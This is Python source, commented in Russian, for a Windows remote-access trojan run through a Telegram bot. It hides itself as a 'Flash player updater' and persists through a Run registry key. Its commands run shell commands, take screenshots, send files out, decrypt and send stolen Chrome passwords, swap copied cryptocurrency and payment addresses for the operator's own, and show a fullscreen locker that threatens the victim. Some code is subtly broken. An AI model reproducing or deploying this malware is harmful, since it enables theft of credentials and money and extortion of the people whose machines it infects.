# -*- coding: utf-8 -*-
import sqlite3, win32crypt
import os
import sys
import time
import shutil
import winreg
import getpass
import telepot
#Импорт необходимых библиотек 
import requests
import win32api
import winshell
import threading
import subprocess			
import encodings.idna				
from PIL import ImageGrab
from telepot.loop import MessageLoop
import win32clipboard
import tkinter as tk
import pyautogui
from tkinter import *
import tkinter.font as font
import pygame
import random


class TigerAttack:
	def __init__(self):
		
		MessageLoop(bot, self.bot_handler).run_as_thread()
		print("[*] Bot connected.")
		for chat in trusted_chats:
			bot.sendMessage(chat, "[*] Bot connected.")
		for user in trusted_users:
			bot.sendMessage(user, "[*] Bot connected.")

		while True:
			time.sleep(10)
	def set_autorun(self):
		application = sys.argv[0]
		print(application)
		start_path = os.path.join(os.path.abspath(os.getcwd()), application)   # Получаем  местонахождение папки

		copy2_path = "{}\\{}".format(winshell.my_documents(), "Adobe flash player")
		copy2_app = os.path.join(copy2_path, "Flash player updater.exe")
		
		if not os.path.exists(copy2_path):
			#os.makedirs(copy2_path)
	
		win32api.CopyFile(start_path, copy2_app)	   # Копируем приложение в папку с незамысловатым названием

		win32api.SetFileAttributes(copy2_path, 2)	   # Делаем папку невидимой
		os.utime(copy2_app, (1282372620, 1282372620))  # Меняем дату создания папки
		os.utime(copy2_path, (1282372620, 1282372620)) # и программы

		startup_val = r"Software\Microsoft\Windows\CurrentVersion\Run"
		key2change = winreg.OpenKey(winreg.HKEY_CURRENT_USER, startup_val, 0, winreg.KEY_ALL_ACCESS)
		winreg.SetValueEx(key2change, 'Flash player updater', 0, winreg.REG_SZ, start_path+" --quiet") # Добавляем программу в автозагрузку с помощью ключа реестра	

# Дальше идёт всё , что связано с взаимодействием человек-бот
	def bot_handler(self, message):
		print(message)

		userid = message["from"]["id"]
		chatid = message["chat"]["id"]

		if userid in trusted_users or chatid in trusted_chats:
			try:
				args = message["text"].split()
			except KeyError:
				args = [""]

				if "document" in message:
					file_id = message["document"]["file_id"]
					file_name = message["document"]["file_name"]
				elif "photo" in message:
					file_id = message["photo"][-1]["file_id"]
					print(message["photo"])
					file_name = "{}.jpg".format(file_id)

				file_path = bot.getFile(file_id)['file_path']
				link = "https://api.telegram.org/file/bot{}/{}".format(token, file_path)
				File = requests.get(link, stream=True).raw
				print(link)

				save_path = os.path.join(os.getcwd(), file_name)
				with open(save_path, "wb") as out_file:
					shutil.copyfileobj(File, out_file)
				
				bot.sendMessage(message["chat"]["id"], "[*] file uploaded")

#Если команда "/help" - показываем список всех возможностей бэкдора
			if args[0] == "/help":
				s = """/help- помощь
					/cmd- выполнить cmd команду, требующую возвращения результата
					/run- запустить программу, не требующую возвращения результатов
					/pwd- текущая дериктория
					/ls- показать файлы в директории
					/cd- сменить дерикторию
					/screen- сделать скриншот экрана
					/download- скачать файл с компьютера
					/passwords- пароли с гугл хрома
					/clipper- клиппер кошельков
					/winlock- запуск винлокера
					/ip- узнать ip адресс пользователя
				"""
				bot.sendMessage(message["chat"]["id"], str(s))

			elif args[0] == "/cmd":
				try:
					s = "[*] {}".format(subprocess.check_output(' '.join(args[1:]), shell=True))
				except Exception as e:
					s = "[!] {}".format(e)

				bot.sendMessage(message["chat"]["id"], "{}".format(str(s)))			

			elif args[0] == "/run":
				try:
					s = "[*] Program started"
					subprocess.Popen(args[1:], shell=True)
					
				except Exception as e:
					s = "[!] {}".format(str(e))
				bot.sendMessage(message["chat"]["id"], "{}".format(str(s)))

			elif args[0] == "/pwd":
				try:
					s = os.path.abspath(os.getcwd())
				except Exception as e:
					s = e
				
				bot.sendMessage(message["chat"]["id"], "[*] {}".format(str(s)))
			elif args[0] == "/ls":
				if len(args) == 1:
					pth = "."
				else:
					pth = args[1]
				s = '\n'.join(os.listdir(path=pth))
				bot.sendMessage(message["chat"]["id"], "[*] {}".format(str(s)))
				
			elif args[0] == "/cd":
				path = os.path.abspath(args[1])
				os.chdir(path)
				bot.sendMessage(message["chat"]["id"], "[*] changing directory to {} ...".format(str(path)))
				
			elif args[0] == "/screen":
				image = ImageGrab.grab()
				image.save("pic.jpg")
				bot.sendDocument(message["chat"]["id"], open("pic.jpg", "rb"))
				os.remove("pic.jpg")

			elif args[0] == "/download":
				File = ' '.join(map(str, args[1:]))
				try:
					bot.sendDocument(message["chat"]["id"], open(File, "rb"))
				except Exception:
					bot.sendMessage(message["chat"]["id"], "[!] you must select the file")
			
			
			
			elif args[0] == "/passwords":
				file = open("passdump.txt", "w")
				file.write("")
				file.close
				def logit(content):
					file = open("passdump.txt", "a")
					file.write(content)
					file.close
				shutil.copyfile(os.path.expanduser('~')+"/AppData/Local/Google/Chrome/User Data/Default/Login Data", "tempdatabase")
				path = os.path.expanduser('~')+"/AppData/Local/Google/Chrome/User Data/Default"
				crdb = os.path.join(os.path.abspath(os.path.split(sys.argv[0])[0]) + "/tempdatabase")
				c = sqlite3.connect(crdb)
				cursor = c.cursor()
				select_statement = "SELECT origin_url, username_value, password_value FROM logins"
				cursor.execute(select_statement)
				login_data = cursor.fetchall()
				outputlist = []
				for url, user_name, pwd, in login_data:
					pwd = win32crypt.CryptUnprotectData(pwd, None, None, None, 0)
					if url != "" and user_name != "" and pwd[1].decode('utf-8') != "":
						outputlist.append(url)
						outputlist.append(user_name)
						outputlist.append(pwd[1].decode('utf-8'))
						outputlist.append("")  
				for item in outputlist:
					try:
						logit(item + "\n")
					except:
						doing = "---nothing------"		
				c.close()
				os.remove(os.path.abspath(os.path.split(sys.argv[0])[0]) + "\\tempdatabase")
				bot.sendDocument(message["chat"]["id"], open("passdump.txt", "rb"))
			elif args[0] == "/clipper":
				#Обьявляем переменные
				btc = 'testworking_btc'			   #В этих переменных вам нужно будет указать свои данные, на которые будет меняться скопированый номер 
				eth = 'testworking_eth'
				ripple = 'testworking_ripple'
				btc_cash = 'testworking_btc_cash'
				litecoin = 'testworking_litecoin'
				monero = 'testworking_monero'
				steamlink = 'steam'
				wmr = 'WebRu'
				wmz = 'WebDol'
				wmx = 'WebBit'
				wmu = 'WebUa'
				dona = 'donat'
				payeer = 'fakePayeer'
				qiwime = 'qiwitest'
				qiwi = 'number'
				def clipper():
					while True:
						win32clipboard.OpenClipboard()
						if win32clipboard.EnumClipboardFormats(win32clipboard.CF_UNICODETEXT) != 0:				
							clip_data = win32clipboard.GetClipboardData(win32clipboard.CF_UNICODETEXT)
							if 25 <= len(clip_data) <= 34 and clip_data != btc and clip_data[0] == '1':			# Если длина скопированого текста больше 25 и меньше 34 и он начинается
								win32clipboard.EmptyClipboard()													# с символа 1 , тогда мы меняем его на текст из переменнной	 btc.
								win32clipboard.SetClipboardText(btc, win32clipboard.CF_UNICODETEXT)				# Все остальные проверки работают по том же принципу
							elif len(clip_data) == 42 and clip_data != eth and clip_data[0:2] == '0x':			
								win32clipboard.EmptyClipboard()
								win32clipboard.SetClipboardText(eth, win32clipboard.CF_UNICODETEXT)
							elif 25 <= len(clip_data) <= 35 and clip_data != ripple and clip_data[0] == 'r':
								win32clipboard.EmptyClipboard()
								win32clipboard.SetClipboardText(ripple, win32clipboard.CF_UNICODETEXT)
							elif len(clip_data[len(clip_data)-42:len(clip_data)]) == 42 and clip_data != btc_cash and clip_data[len(clip_data)-42:len(clip_data)-41] == 'q':
								win32clipboard.EmptyClipboard()
								win32clipboard.SetClipboardText(clip_data[0:len(clip_data)-42] + btc_cash, win32clipboard.CF_UNICODETEXT)
							elif len(clip_data) == 34 and clip_data != litecoin and (clip_data[0] == 'L' or clip_data[0] == '3'):
								win32clipboard.EmptyClipboard()
								win32clipboard.SetClipboardText(litecoin, win32clipboard.CF_UNICODETEXT)
							elif 95 <= len(clip_data) <= 106 and clip_data != monero and clip_data[0] == '4':
								win32clipboard.EmptyClipboard()
								win32clipboard.SetClipboardText(monero, win32clipboard.CF_UNICODETEXT)
							elif 75 <= len(clip_data) <=76 and clip_data !=steamlink and clip_data[0] == 'h' and clip_data[8] == 's' and clip_data[13] == 'c' and clip_data[27] == 't' and clip_data[36] == 'r':
								win32clipboard.EmptyClipboard()
								win32clipboard.SetClipboardText(steamlink, win32clipboard.CF_UNICODETEXT)
							elif 74 <= len(clip_data) <=76 and clip_data !=steamlink and clip_data[0] == 'h' and clip_data[8] == 's' and clip_data[13] == 'c' and clip_data[27] == 't' and clip_data[36] == 'r':
								win32clipboard.EmptyClipboard()
								win32clipboard.SetClipboardText(steamlink1, win32clipboard.CF_UNICODETEXT)
							elif 12 <= len(clip_data) <= 13 and clip_data != wmr and clip_data[0] == 'R' or clip_data[0] == 'r':
								win32clipboard.EmptyClipboard()
								win32clipboard.SetClipboardText(wmr, win32clipboard.CF_UNICODETEXT)
							elif 12<= len(clip_data) <= 13 and clip_data != wmz and clip_data[0] == 'Z' or clip_data[0] == 'z':
								win32clipboard.EmptyClipboard()
								win32clipboard.SetClipboardText(wmz, win32clipboard.CF_UNICODETEXT)
							elif 12<= len(clip_data) <= 13 and clip_data != wmx and clip_data[0] == 'X' or clip_data[0] == 'x':
								win32clipboard.EmptyClipboard()
								win32clipboard.SetClipboardText(wmu, win32clipboard.CF_UNICODETEXT)
							elif 12<= len(clip_data) <= 13 and clip_data != wmu and clip_data[0] == 'U' or clip_data[0] == 'u':
								win32clipboard.EmptyClipboard()
								win32clipboard.SetClipboardText(wmu, win32clipboard.CF_UNICODETEXT)
							elif 37 <= len(clip_data) <= 50 and clip_data !=dona and clip_data[12] == 'd' and clip_data[13] == 'o' and clip_data[14] == 'n' and clip_data[20] == 'a' and clip_data[25] == 's':
								win32clipboard.EmptyClipboard()
								win32clipboard.SetClipboardText(dona, win32clipboard.CF_UNICODETEXT)
							elif 8 <= len(clip_data) <= 9 and clip_data != payeer and clip_data[0] == 'P' or clip_data[0] == 'p':
								win32clipboard.EmptyClipboard()
								win32clipboard.SetClipboardText(payeer, win32clipboard.CF_UNICODETEXT)
							elif 10 <= len(clip_data) <= 36 and clip_data !=qiwime and clip_data[0] == 'h' and clip_data[8] == 'q' and clip_data[13] == 'm' and clip_data[14] == 'e':
								win32clipboard.EmptyClipboard()
								win32clipboard.SetClipboardText(qiwime, win32clipboard.CF_UNICODETEXT)
							  
						win32clipboard.CloseClipboard()
						time.sleep(0.25)					 #Интервал 0.25 сек
			
				clipper = threading.Thread(target=clipper)
				clipper.start()
			
			elif args[0] == "/winlock":
				
				stroke = " "
				password = ("py") # Это ваш пароль для отключения локера , вы можете изменить его 
				time = 120
				del_text = "It's time to make some BOOOM!" #Этот текст будет выведен через время , определенное в переменной  (time)
				 
				 
				def blockroot():
					pyautogui.click(x=870,y=480)				# Автоклик	на определенные координаты по осям	х и у
					pyautogui.moveTo(x=870,y=480)				# Автонаводка курсора на определенные координаты по осям  х и у 
					root.protocol("WM_DELETE_WINDOW",blockroot) # Обработчик протоколов для взаемодействия	диспетчера окон и приложения 
					root.update()

				# Функция для проверки правильности введенного пароля
				def check_password(event):
					global stroke 
					stroke=textfield.get()
					if stroke==password:
						root.destroy()
						

				pyautogui.FAILSAFE=False					# Для того , чтобы курсор не вылетел за уровень экрана и не случались сбои в работе программы из-за pyautogui 
															# Другими словами -	 это  функция отказоустойчивости.
				root = Tk()
				root.title("The End Of Your System")
				root.attributes("-fullscreen",True)
				root.configure(background="#1c1c1c")
				
				
				
				

				# Обьявление виджетов tkinter
				textfield=Entry(root,fg="green")
				but= Button(root,text="unlock")
				text=Label(root,text="tigerk00",font="System 10",fg="#32CD32",bg="black")
				text1=Label(root,text="Don't even think to turn off or restart your device - your system will delete immediately!",font = "System 25",fg="red",bg="black")
				l=Label(text=time,font="System 15", bg = 'black' ,	fg = 'white' )
				l1=Label(text="The remaining time of your system's life...",fg="white", bg = 'black' , font="System 15")
				MyFont = font.Font(family="Helvetica",size=15,weight="bold")
				textfield['font']= MyFont
				text0 = Label(root , text = "Your system is blocked !" , font = "System 30" , fg="green"  , bg="black")

				# Раположение виджетов в окне
				text1.place(x = 100 , y = 70)
				text0.place(x=700 , y = 0)
				text.place(x = 10 , y = 0)
				l1.place(x = 10 , y = 150)
				l.place(x = 590 ,  y =150)
				but.place(x = 900 , y = 520)
				textfield.place(width=200,height=30,x=860,y=480)

				root.bind("<Return>" , check_password )	   # Так как автоклик и автонаводка курсора будет на поле ввода , жертвe физически тяжело будет
				root.update()							   # нажать на кнопку , так что пришлось привязать событие с проверкой пароля на клавишу Enter , для ее удобства :)	 
				pyautogui.click(x = 900 , y = 520)
				pyautogui.moveTo(x = 900 , y = 520)


				while stroke!=password:
					l.configure(text=time)
					root.after(300)
					if time==0:													 # Суть строк (89 -95) в следущем - по окончании времени у пользователя начинает открываться папка
						time=del_text											 # "Документы" , и так до бесконечности , т.к. цикл бесконечный . Окно винлокера сворачивается ,
						
					if time!=del_text:											 # Обратный отсчет времени
						time=time-1 
						
					blockroot()




				root.mainloop()	 
			
			
			elif args[0] == '/ip':
				r = requests.get('http://ip.42.pl/raw')		#Отправляем запрос на сайт для того , чтобы узнать ip пользователя...
				ip = r.text									#.. И заносим его в переменную
				bot.sendMessage(message["chat"]["id"], "ip пользователя:" + str(ip)) #Отправляем благополучно полученое ip нам через бота
			
			
			
			
			
			
			else:
				bot.sendMessage(message["chat"]["id"], "[*] /help для вывода команд")

		else:
			bot.sendMessage(message["chat"]["id"], "Уходи.")
		


if __name__ == '__main__':
	token = 'ВАШ_ТОКЕН'				 # Тут нужен ваш токен к боту 
	bot = telepot.Bot(token)
	
	trusted_users = [ВАШ_id]		 # Тут - id вашего аккаунта телеграмм
	trusted_chats = [ВАШ_id]	 # Тут - id вашего чата телеграмм
	
	trojan = TigerAttack()			 